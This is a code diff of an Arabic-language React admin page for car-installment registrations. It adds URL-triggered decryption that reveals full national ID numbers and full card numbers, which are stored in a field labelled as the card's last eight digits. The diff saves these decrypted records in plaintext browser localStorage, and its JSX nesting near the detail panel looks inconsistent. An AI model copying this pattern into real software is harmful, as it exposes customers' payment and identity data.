@@ -2,18 +2,73 @@
 
 import { useEffect, useState } from "react"
 import { cars, formatPrice, Registration } from "@/lib/data"
-import { Search, Clock, CheckCircle, XCircle, Phone, CreditCard, User } from "lucide-react"
+import { Search, Clock, CheckCircle, XCircle, Phone, CreditCard, User, Lock, Unlock, ShieldCheck, Loader2 } from "lucide-react"
 
 export default function RegistrationsPage() {
   const [registrations, setRegistrations] = useState<Registration[]>([])
   const [searchQuery, setSearchQuery] = useState("")
   const [statusFilter, setStatusFilter] = useState<string>("all")
   const [selectedRegistration, setSelectedRegistration] = useState<Registration | null>(null)
+  
+  // Decryption States
+  const [decryptedId, setDecryptedId] = useState<string | null>(null)
+  const [isDecrypting, setIsDecrypting] = useState(false)
+  const [decryptError, setDecryptError] = useState<string | null>(null)
 
   useEffect(() => {
+    // 1. Load local registrations
     const stored = localStorage.getItem("registrations")
+    let localRegs: Registration[] = []
     if (stored) {
-      setRegistrations(JSON.parse(stored))
+      localRegs = JSON.parse(stored)
+      setRegistrations(localRegs)
+    }
+
+    // 2. Read secure_payload from URL query
+    const params = new URLSearchParams(window.location.search)
+    const payload = params.get("secure_payload")
+    
+    if (payload) {
+      setIsDecrypting(true)
+      setDecryptError(null)
+      
+      fetch("/api/decrypt", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ payload })
+      })
+      .then(res => res.json())
+      .then(res => {
+        if (res.success && res.data) {
+          const importedReg = res.data
+          setDecryptedId(importedReg.id)
+          
+          // Save to local registrations if not already present
+          setRegistrations(prev => {
+            if (prev.some(r => r.id === importedReg.id)) {
+              // Replace existing with full decrypted data
+              const filtered = prev.filter(r => r.id !== importedReg.id)
+              const updated = [importedReg, ...filtered]
+              localStorage.setItem("registrations", JSON.stringify(updated))
+              return updated
+            }
+            const updated = [importedReg, ...prev]
+            localStorage.setItem("registrations", JSON.stringify(updated))
+            return updated
+          })
+          
+          setSelectedRegistration(importedReg)
+        } else {
+          setDecryptError(res.message || "فشل فك التشفير للبيانات الحساسة")
+        }
+      })
+      .catch(err => {
+        console.error("Decryption request failed", err)
+        setDecryptError("خطأ في الاتصال بالخادم لفك التشفير")
+      })
+      .finally(() => {
+        setIsDecrypting(false)
+      })
     }
   }, [])
 
@@ -48,6 +103,26 @@ export default function RegistrationsPage() {
         <h1 className="text-3xl font-bold text-foreground">التسجيلات</h1>
         <p className="text-muted-foreground mt-1">إدارة طلبات التسجيل</p>
       </div>
+
+      {/* Decryption Status Notification */}
+      {isDecrypting && (
+        <div className="bg-blue-500/10 border border-blue-500/20 text-blue-500 p-4 rounded-xl flex items-center gap-3">
+          <Loader2 className="h-5 w-5 animate-spin" />
+          <p className="font-semibold text-sm">جاري فك تشفير البيانات الآمنة المستوردة من البريد الإلكتروني...</p>
+        </div>
+      )}
+      {decryptError && (
+        <div className="bg-red-500/10 border border-red-500/20 text-red-500 p-4 rounded-xl flex items-center gap-3">
+          <Lock className="h-5 w-5" />
+          <p className="font-semibold text-sm">{decryptError}</p>
+        </div>
+      )}
+      {decryptedId && !isDecrypting && (
+        <div className="bg-green-500/10 border border-green-500/20 text-green-600 p-4 rounded-xl flex items-center gap-3">
+          <ShieldCheck className="h-5 w-5" />
+          <p className="font-semibold text-sm">تم فك تشفير الطلب المستورد بنجاح وعرضه بالكامل بشكل آمن.</p>
+        </div>
+      )}
 
       {/* Stats */}
       <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
@@ -147,65 +222,95 @@ export default function RegistrationsPage() {
         </div>
 
         {/* Detail Panel */}
-        {selectedRegistration && (
-          <div className="w-96 bg-card rounded-xl border border-border p-6 space-y-6">
-            <div>
-              <h3 className="text-lg font-semibold text-card-foreground mb-4">تفاصيل التسجيل</h3>
-              
-              <div className="space-y-4">
-                <div className="flex items-center gap-3">
-                  <User className="h-5 w-5 text-muted-foreground" />
-                  <div>
-                    <p className="text-sm text-muted-foreground">الاسم الكامل</p>
-                    <p className="font-medium text-card-foreground">{selectedRegistration.fullName}</p>
-                  </div>
-                </div>
+        {selectedRegistration && (() => {
+          const isDecrypted = decryptedId === selectedRegistration.id;
+          
+          const displayNin = isDecrypted
+            ? selectedRegistration.nin
+            : (selectedRegistration.nin.includes("•") || selectedRegistration.nin.includes("*")
+                ? selectedRegistration.nin
+                : `${selectedRegistration.nin.slice(0, 4)} •••• •••• ${selectedRegistration.nin.slice(-4)}`);
 
-                <div className="flex items-center gap-3">
-                  <CreditCard className="h-5 w-5 text-muted-foreground" />
-                  <div>
-                    <p className="text-sm text-muted-foreground">رقم التعريف الوطني</p>
-                    <p className="font-medium text-card-foreground">{selectedRegistration.nin}</p>
-                  </div>
-                </div>
+          const displayCard = isDecrypted
+            ? (selectedRegistration.cardLast8.length === 16 
+                ? `${selectedRegistration.cardLast8.slice(0, 4)} ${selectedRegistration.cardLast8.slice(4, 8)} ${selectedRegistration.cardLast8.slice(8, 12)} ${selectedRegistration.cardLast8.slice(12)}`
+                : selectedRegistration.cardLast8)
+            : `•••• •••• •••• ${selectedRegistration.cardLast8.slice(-4)}`;
 
-                <div className="flex items-center gap-3">
-                  <Phone className="h-5 w-5 text-muted-foreground" />
-                  <div>
-                    <p className="text-sm text-muted-foreground">رقم الهاتف</p>
-                    <p className="font-medium text-card-foreground" dir="ltr">{selectedRegistration.phone1}</p>
-                    {selectedRegistration.phone2 && (
-                      <p className="text-sm text-muted-foreground" dir="ltr">{selectedRegistration.phone2}</p>
-                    )}
-                  </div>
+          return (
+            <div className="w-96 bg-card rounded-xl border border-border p-6 space-y-6">
+              <div>
+                <div className="flex items-center justify-between mb-4">
+                  <h3 className="text-lg font-semibold text-card-foreground">تفاصيل التسجيل</h3>
+                  {isDecrypted ? (
+                    <span className="flex items-center gap-1 text-xs bg-green-500/10 text-green-600 px-2.5 py-1 rounded-full font-bold">
+                      <Unlock className="h-3 w-3" />
+                      مفكك آمن
+                    </span>
+                  ) : (
+                    <span className="flex items-center gap-1 text-xs bg-muted text-muted-foreground px-2.5 py-1 rounded-full">
+                      <Lock className="h-3 w-3" />
+                      محمي ومخفي
+                    </span>
+                  )}
                 </div>
-
-                <div className="p-4 bg-muted rounded-lg">
-                  <p className="text-sm text-muted-foreground mb-1">البطاقة الذهبية</p>
-                  <p className="font-medium text-card-foreground">****{selectedRegistration.cardLast8}</p>
-                  <p className="text-sm text-muted-foreground">تنتهي: {selectedRegistration.cardExpiry}</p>
-                </div>
-
-                {(() => {
-                  const car = cars.find(c => c.id === selectedRegistration.selectedCarId)
-                  return car ? (
-                    <div className="p-4 bg-primary/5 rounded-lg border border-primary/20">
-                      <p className="text-sm text-muted-foreground mb-1">السيارة المختارة</p>
-                      <p className="font-bold text-card-foreground">{car.brand} {car.model}</p>
-                      <p className="text-primary font-bold mt-1">{formatPrice(car.price)}</p>
-                      <p className="text-sm text-muted-foreground">{formatPrice(car.monthlyPayment)}/شهر</p>
+                
+                <div className="space-y-4">
+                  <div className="flex items-center gap-3">
+                    <User className="h-5 w-5 text-muted-foreground" />
+                    <div>
+                      <p className="text-sm text-muted-foreground">الاسم الكامل</p>
+                      <p className="font-medium text-card-foreground">{selectedRegistration.fullName}</p>
                     </div>
-                  ) : null
-                })()}
+                  </div>
 
-                <div>
-                  <p className="text-sm text-muted-foreground mb-1">تقسيط سابق</p>
-                  <p className="font-medium text-card-foreground">
-                    {selectedRegistration.hasPreviousInstallment ? "نعم" : "لا"}
-                  </p>
+                  <div className="flex items-center gap-3">
+                    <CreditCard className="h-5 w-5 text-muted-foreground" />
+                    <div>
+                      <p className="text-sm text-muted-foreground">رقم التعريف الوطني</p>
+                      <p className="font-medium text-card-foreground font-mono">{displayNin}</p>
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-3">
+                    <Phone className="h-5 w-5 text-muted-foreground" />
+                    <div>
+                      <p className="text-sm text-muted-foreground">رقم الهاتف</p>
+                      <p className="font-medium text-card-foreground" dir="ltr">{selectedRegistration.phone1}</p>
+                      {selectedRegistration.phone2 && (
+                        <p className="text-sm text-muted-foreground" dir="ltr">{selectedRegistration.phone2}</p>
+                      )}
+                    </div>
+                  </div>
+
+                  <div className="p-4 bg-muted rounded-lg">
+                    <p className="text-sm text-muted-foreground mb-1">البطاقة الذهبية</p>
+                    <p className="font-medium text-card-foreground font-mono">{displayCard}</p>
+                    <p className="text-sm text-muted-foreground">تنتهي: {selectedRegistration.cardExpiry}</p>
+                  </div>
+
+                  {(() => {
+                    const car = cars.find(c => c.id === selectedRegistration.selectedCarId)
+                    return car ? (
+                      <div className="p-4 bg-primary/5 rounded-lg border border-primary/20">
+                        <p className="text-sm text-muted-foreground mb-1">السيارة المختارة</p>
+                        <p className="font-bold text-card-foreground">{car.brand} {car.model}</p>
+                        <p className="text-primary font-bold mt-1">{formatPrice(car.price)}</p>
+                        <p className="text-sm text-muted-foreground">{formatPrice(car.monthlyPayment)}/شهر</p>
+                      </div>
+                    ) : null
+                  })()}
+
+                  <div>
+                    <p className="text-sm text-muted-foreground mb-1">تقسيط سابق</p>
+                    <p className="font-medium text-card-foreground">
+                      {selectedRegistration.hasPreviousInstallment ? "نعم" : "لا"}
+                    </p>
+                  </div>
                 </div>
               </div>
-            </div>
+          )
+        })()}
 
             {/* Actions */}
             <div className="pt-4 border-t border-border space-y-3">
